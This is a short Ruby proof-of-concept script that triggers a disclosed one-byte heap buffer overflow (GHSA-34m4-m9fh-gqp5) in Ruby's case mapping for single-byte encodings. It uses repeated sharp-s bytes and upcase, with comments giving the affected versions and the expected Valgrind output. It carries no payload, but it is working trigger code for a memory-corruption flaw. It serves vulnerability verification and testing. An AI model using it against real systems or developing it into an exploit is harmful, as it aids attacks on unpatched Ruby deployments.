#!/usr/bin/env ruby
# frozen_string_literal: true

# Minimal trigger for GHSA-34m4-m9fh-gqp5
# One-byte heap buffer overflow in single-byte encoding case mapping.
#
# Conditions:
#   - Ruby 3.4.12, 3.3.13, 4.0.9 or earlier (affected)
#   - Single-byte legacy encoding (ISO-8859-1, Windows-1252, etc.)
#   - 21+ consecutive sharp-s (\xDF) characters
#   - Case conversion method: upcase / swapcase / downcase(:fold) / casecmp?
#
# Expected under Valgrind:
#   Invalid write of size 1 in case_map (iso_8859_1.c:293)
#
# Expected under stock glibc:
#   Silent execution (byte lands in allocator padding)

REQUIRED_SIZE = 21
ENCODING      = "ISO-8859-1"
METHOD        = :upcase

puts "[+] Ruby version: #{RUBY_VERSION}"
puts "[+] Encoding:     #{ENCODING}"
puts "[+] Input size:   #{REQUIRED_SIZE} bytes"
puts "[+] Method:       #{METHOD}"
puts "[+] Building trigger string..."

s = "\xDF" * REQUIRED_SIZE
s.force_encoding(ENCODING)

puts "[+] Calling ##{METHOD}..."
result = s.public_send(METHOD)

puts "[+] Result length: #{result.bytesize} bytes"
puts "[+] Done — if running under Valgrind, check for 'Invalid write' above."
